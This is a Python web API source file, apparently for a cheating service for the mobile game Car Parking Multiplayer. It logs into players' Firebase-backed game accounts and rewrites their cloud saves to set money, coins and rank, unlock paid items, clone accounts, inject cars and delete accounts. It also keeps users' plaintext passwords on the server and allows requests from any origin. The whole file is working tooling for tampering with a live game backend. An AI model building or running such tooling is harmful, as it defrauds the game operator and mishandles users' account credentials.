UNLOCK_SOURCE_EMAIL = os.environ.get("UNLOCK_SOURCE_EMAIL", "").strip()
UNLOCK_SOURCE_PASSWORD = os.environ.get("UNLOCK_SOURCE_PASSWORD", "")
CPM_PROXY_SECRET = os.environ.get("CPM_SECRET", "").strip()

# Original feature map, without Telegram callback IDs.
FEATURES = {
    "w16": nuker.unlock_w16,
    "sirens": nuker.unlock_sirens,
    "horns": nuker.unlock_horns,
    "damage": nuker.disable_damage,
    "fuel": nuker.unlimited_fuel,
    "smoke": nuker.unlock_smoke,
    "animations": nuker.unlock_animations,
    "wheels": nuker.unlock_wheels,
    "headlights": nuker.unlock_headlights,
    "clothes": nuker.unlock_all_clothes,
    "houses": nuker.unlock_houses,
    "levels": nuker.complete_all_levels,
    "rank": nuker.set_rank,
}

def response(data, status=200):
    return web.json_response(data, status=status)

def session_uid(body):
    sid = str(body.get("session_id", "")).strip()
    return WEB_SESSIONS.get(sid)

async def health(request):
    return response({
        "ok": True,
        "service": "cpm-web-api",
        "brotli": HAS_BROTLI,
        "crypto": HAS_CRYPTO,
        "firebase_key_configured": bool(FK),
        "operations": [
            "register", "money", "coin", "player_name", "player_id",
            "race_wins", "race_loses", "rank",
            "w16", "sirens", "horns", "damage", "fuel", "smoke",
            "animations", "wheels", "headlights", "clothes",
            "houses", "levels", "unlock_all",
            "change_email", "change_password",
            "delete_friends", "fix_account",
            "clone_account", "inject_car", "delete_account"
        ]
    })

async def login(request):
    if not FK:
        return response({"ok": False, "message": "SERVER_MISSING_FIREBASE_KEY"}, 500)

    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)

    email = str(body.get("email", "")).strip()
    password = str(body.get("password", ""))

    if not email or not password:
        return response({"ok": False, "message": "EMAIL_AND_PASSWORD_REQUIRED"}, 400)

    result = await nuker.login(email, password)
    if not result.get("ok"):
        return response(result, 401)

    internal_uid = random.randint(1_000_000_000, 9_999_999_999)
    nuker.save_token(
        internal_uid,
        result["auth"],
        email,
        password,
        result.get("refresh_token", ""),
        result.get("firebase_uid", "")
    )

    loaded = await nuker.load(internal_uid, force=True)
    if not loaded:
        # Give the frontend a useful diagnostic instead of hiding the
        # underlying load/decryption failure.
        td = nuker.get_token_data(internal_uid) or {}
        diagnostic = {
            "token_saved": bool(td),
            "firebase_uid_present": bool(td.get("firebase_uid")),
            "auth_token_present": bool(td.get("auth_token")),
            "email_present": bool(td.get("email")),
        }
        nuker.delete_token(internal_uid)
        log.error("WEB LOGIN LOAD FAILED: %s", diagnostic)
        return response({
            "ok": False,
            "message": "COULD_NOT_LOAD_OR_DECRYPT_ACCOUNT",
            "stage": "load_or_decrypt",
            "diagnostic": diagnostic,
            "hint": "Firebase login succeeded, but CPM player data could not be loaded or decrypted. Check Render logs for the exact load/decrypt failure."
        }, 400)

    td = nuker.get_token_data(internal_uid) or {}
    record = nuker.get_record(internal_uid, td.get("email")) or {}

    sid = secrets.token_urlsafe(32)
    WEB_SESSIONS[sid] = internal_uid
    SESSION_UIDS[internal_uid] = sid

    return response({
        "ok": True,
        "session_id": sid,
        "player_name": record.get("Name", ""),
        "player_id": record.get("localID", ""),
        "money": record.get("money", 0),
        "coin": record.get("coin", 0)
    })

async def register(request):
    """Create a Firebase account and initialize the CPM player record.

    This mirrors the working Telegram bot signup flow: Firebase signup ->
    save auth token -> create the default player record -> push it through
    the normal CPM partial-save endpoint.
    """
    if not FK:
        return response({"ok": False, "message": "SERVER_MISSING_FIREBASE_KEY"}, 500)

    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)

    email = str(body.get("email", "")).strip()
    password = str(body.get("password", ""))

    if not email or not password:
        return response({"ok": False, "message": "EMAIL_AND_PASSWORD_REQUIRED"}, 400)

    # Basic validation before calling Firebase.
    if not re.fullmatch(r"[^@\s]+@[^@\s]+\.[^@\s]+", email):
        return response({"ok": False, "message": "INVALID_EMAIL"}, 400)

    if len(password) < 6 or len(password) > 256:
        return response({
            "ok": False,
            "message": "PASSWORD_MUST_BE_6_TO_256_CHARS"
        }, 400)

    result = await nuker.register(email, password)

    if not result.get("ok"):
        # Keep Firebase's useful error code, but do not expose tokens.
        return response({
            "ok": False,
            "message": result.get("message", "REGISTRATION_FAILED")
        }, 400)

    # The Telegram bot does more than Firebase sign-up. It immediately
    # initializes a basic CPM player record and pushes it to the cloud.
    # Without this step, the Firebase account exists but CPM can get stuck
    # while sending/loading records.
    internal_uid = random.randint(1_000_000_000, 9_999_999_999)

    nuker.save_token(
        internal_uid,
        result["auth"],
        email,
        password,
        result.get("refresh_token", ""),
        result.get("firebase_uid", "")
    )

    default_record = {
        "Name": "Player Name#",
        "localID": "-",
        "money": 25000,
        "coin": 0,
        "floats": [0.0] * 54,
        "integers": [0] * 120,
        "LevelsDoneTime": [0] * 110
    }

    nuker.set_record(internal_uid, default_record, email)

    log.info("WEB REGISTER: Firebase account created; pushing initial CPM profile for %s", email)
    save_res = await nuker._save(internal_uid, default_record)

    if not save_res.get("ok"):
        nuker.delete_token(internal_uid)
        log.error("WEB REGISTER INITIAL SAVE FAILED: %s", save_res.get("message"))
        return response({
            "ok": False,
            "message": f"INITIAL_CPM_SYNC_FAILED: {save_res.get('message', 'UNKNOWN_ERROR')}"
        }, 400)

    log.info("WEB REGISTER: initial CPM profile synced successfully for %s", email)

    return response({
        "ok": True,
        "message": "ACCOUNT_CREATED_AND_INITIALIZED",
        "firebase_uid": result.get("firebase_uid", "")
    }, 200)

async def logout(request):
    try:
        body = await request.json()
    except Exception:
        body = {}

    sid = str(body.get("session_id", "")).strip()
    uid = WEB_SESSIONS.pop(sid, None)

    if uid is not None:
        SESSION_UIDS.pop(uid, None)
        try:
            nuker.delete_token(uid)
        except Exception:
            pass

    return response({"ok": True})

async def operation(request):
    op = request.match_info["op"]

    if op == "unlock_all":
        return await unlock_all(request)
    if op == "change_email":
        return await change_email(request)
    if op == "change_password":
        return await change_password(request)
    if op == "delete_friends":
        return await delete_friends(request)
    if op == "fix_account":
        return await fix_account(request)
    if op == "clone_account":
        return await clone_account(request)
    if op == "inject_car":
        return await inject_car(request)
    if op == "delete_account":
        return await delete_account(request)

    fn = FEATURES.get(op)

    if fn is None:
        aliases = {
            "money": nuker.set_money,
            "coin": nuker.set_coin,
            "player_name": nuker.set_player_name,
            "player_id": nuker.set_player_id,
            "race_wins": nuker.set_race_wins,
            "race_loses": nuker.set_race_loses,
        }
        fn = aliases.get(op)

    if fn is None:
        return response({"ok": False, "message": "UNKNOWN_OPERATION"}, 404)

    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)

    uid = session_uid(body)
    if uid is None:
        return response({"ok": False, "message": "INVALID_SESSION"}, 401)

    try:
        if op in {"money", "coin", "race_wins", "race_loses"}:
            amount = int(body.get("amount"))
            if amount < 0:
                raise ValueError
            if op == "money":
                amount = min(amount, MAX_MONEY)
            if op == "coin":
                amount = min(amount, MAX_COIN)
            result = await fn(uid, amount)

        elif op == "player_name":
            result = await fn(uid, str(body.get("value", "")))

        elif op == "player_id":
            result = await fn(uid, str(body.get("value", "")))

        elif op == "rank" or op in FEATURES:
            result = await fn(uid)

        else:
            result = await fn(uid)

        if result is None:
            result = {"ok": True}

        return response(result, 200 if result.get("ok", True) else 400)

    except (TypeError, ValueError):
        return response({"ok": False, "message": "INVALID_VALUE"}, 400)
    except Exception as e:
        log.exception("Operation %s failed", op)
        return response({
            "ok": False,
            "message": f"{type(e).__name__}: {e}"
        }, 500)

async def unlock_all(request):
    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)

    uid = session_uid(body)
    if uid is None:
        return response({"ok": False, "message": "INVALID_SESSION"}, 401)

    results = {}
    for name, fn in FEATURES.items():
        try:
            result = await fn(uid)
            results[name] = result
            if not result.get("ok"):
                return response({
                    "ok": False,
                    "message": f"UNLOCK_ALL_FAILED:{name}:{result.get('message','')}",
                    "results": results
                }, 400)
        except Exception as e:
            log.exception("Unlock-all %s failed", name)
            return response({
                "ok": False,
                "message": f"UNLOCK_ALL_FAILED:{name}:{type(e).__name__}:{e}",
                "results": results
            }, 500)

    return response({"ok": True, "message": "ALL_FEATURES_COMPLETED", "results": results})

async def change_email(request):
    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)
    uid = session_uid(body)
    if uid is None:
        return response({"ok": False, "message": "INVALID_SESSION"}, 401)
    new_email = str(body.get("value", "")).strip()
    if not re.fullmatch(r"[^@\s]+@[^@\s]+\.[^@\s]+", new_email):
        return response({"ok": False, "message": "INVALID_EMAIL"}, 400)
    result = await nuker.change_email(uid, new_email)
    return response(result, 200 if result.get("ok") else 400)

async def change_password(request):
    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)
    uid = session_uid(body)
    if uid is None:
        return response({"ok": False, "message": "INVALID_SESSION"}, 401)
    new_password = str(body.get("value", ""))
    if len(new_password) < 6 or len(new_password) > 256:
        return response({"ok": False, "message": "PASSWORD_MUST_BE_6_TO_256_CHARS"}, 400)
    result = await nuker.change_password(uid, new_password)
    return response(result, 200 if result.get("ok") else 400)

async def delete_friends(request):
    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)
    uid = session_uid(body)
    if uid is None:
        return response({"ok": False, "message": "INVALID_SESSION"}, 401)
    result = await nuker.delete_friends(uid)
    return response(result, 200 if result.get("ok") else 400)

async def fix_account(request):
    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)
    uid = session_uid(body)
    if uid is None:
        return response({"ok": False, "message": "INVALID_SESSION"}, 401)
    result = await nuker.fix_account(uid)
    return response(result, 200 if result.get("ok") else 400)

async def delete_account(request):
    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)
    uid = session_uid(body)
    if uid is None:
        return response({"ok": False, "message": "INVALID_SESSION"}, 401)
    if body.get("confirm") is not True:
        return response({
            "ok": False,
            "message": "CONFIRM_REQUIRED"
        }, 400)
    result = await nuker.delete_account(uid)
    if result.get("ok"):
        sid = SESSION_UIDS.pop(uid, None)
        if sid:
            WEB_SESSIONS.pop(sid, None)
    return response(result, 200 if result.get("ok") else 400)

async def clone_account(request):
    try:
        body = await request.json()
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)

    uid = session_uid(body)
    if uid is None:
        return response({"ok": False, "message": "INVALID_SESSION"}, 401)

    source_email = str(body.get("source_email", "")).strip()
    source_password = str(body.get("source_password", ""))
    target_email = str(body.get("target_email", "")).strip()
    target_password = str(body.get("target_password", ""))

    if not source_email or not source_password or not target_email or not target_password:
        return response({"ok": False, "message": "SOURCE_AND_TARGET_CREDENTIALS_REQUIRED"}, 400)

    try:
        result = await nuker.clone_account(uid, target_email, target_password)
        return response(result, 200 if result.get("ok") else 400)
    except Exception as e:
        log.exception("Clone account failed")
        return response({"ok": False, "message": f"{type(e).__name__}: {e}"}, 500)

async def inject_car(request):
    if not CPM_PROXY_SECRET:
        return response({"ok": False, "message": "SERVER_MISSING_PROXY_SECRET"}, 500)
    provided_secret = str(request.headers.get("X-Proxy-Secret", ""))
    if not secrets.compare_digest(provided_secret, CPM_PROXY_SECRET):
        return response({"ok": False, "message": "INVALID_PROXY_SECRET"}, 401)
    try:
        body = await request.json()
        car_id = int(body.get("car_id"))
    except (TypeError, ValueError):
        return response({"ok": False, "message": "INVALID_CAR_ID"}, 400)
    except Exception:
        return response({"ok": False, "message": "INVALID_JSON"}, 400)

    uid = session_uid(body)
    if uid is None:
        return response({"ok": False, "message": "INVALID_SESSION"}, 401)
    if not 0 < car_id <= 100000:
        return response({"ok": False, "message": "INVALID_CAR_ID"}, 400)
    if not UNLOCK_SOURCE_EMAIL or not UNLOCK_SOURCE_PASSWORD:
        return response({"ok": False, "message": "SOURCE_CREDENTIALS_NOT_CONFIGURED"}, 400)

    target_data = nuker.get_token_data(uid) or {}
    target_email = str(target_data.get("email", "")).strip()
    target_password = str(target_data.get("password", ""))
    saved_target_uid = str(target_data.get("firebase_uid", "")).strip()
    if not target_email or not target_password:
        return response({"ok": False, "message": "TARGET_SESSION_CREDENTIALS_UNAVAILABLE"}, 400)

    target_token, target_uid = await asyncio.to_thread(
        verify_user, target_email, target_password
    )
    if not target_token or not target_uid:
        return response({"ok": False, "message": "TARGET_LOGIN_FAILED"}, 400)
    if saved_target_uid and str(target_uid) != saved_target_uid:
        return response({"ok": False, "message": "TARGET_SESSION_ACCOUNT_MISMATCH"}, 400)

    source_token, source_uid = await asyncio.to_thread(
        verify_user, UNLOCK_SOURCE_EMAIL, UNLOCK_SOURCE_PASSWORD
    )
    if not source_token or not source_uid:
        return response({"ok": False, "message": "SOURCE_LOGIN_FAILED"}, 400)
    if str(source_uid) == str(target_uid):
        return response({"ok": False, "message": "SOURCE_AND_TARGET_ARE_SAME_ACCOUNT"}, 400)

    try:
        result = await asyncio.to_thread(
            cpm1_inject_car_from_source, source_token, target_token, target_uid, car_id
        )
    except Exception as exc:
        log.exception("Custom car injection failed")
        return response({"ok": False, "message": f"CAR_INJECTION_ERROR:{type(exc).__name__}"}, 500)
    return response(result, 200 if result.get("ok") else 400)
@web.middleware
async def cors(request, handler):
    if request.method == "OPTIONS":
        resp = web.Response(status=204)
    else:
        try:
            resp = await handler(request)
        except web.HTTPException as e:
            resp = e
        except Exception:
            log.exception("Unhandled request error")
            resp = response({"ok": False, "message": "SERVER_ERROR"}, 500)

    resp.headers["Access-Control-Allow-Origin"] = "*"
    resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
    resp.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return resp

app = web.Application(middlewares=[cors])
app.router.add_get("/api/health", health)
app.router.add_post("/api/login", login)
app.router.add_post("/api/register", register)
app.router.add_post("/api/logout", logout)
app.router.add_post("/api/operation/{op}", operation)

if __name__ == "__main__":
    if not FK:
        log.warning("FIREBASE_KEY is not configured.")
    port = int(os.environ.get("PORT", "10000"))
    log.info("Starting CPM web API on 0.0.0.0:%s", port)
    web.run_app(app, host="0.0.0.0", port=port)
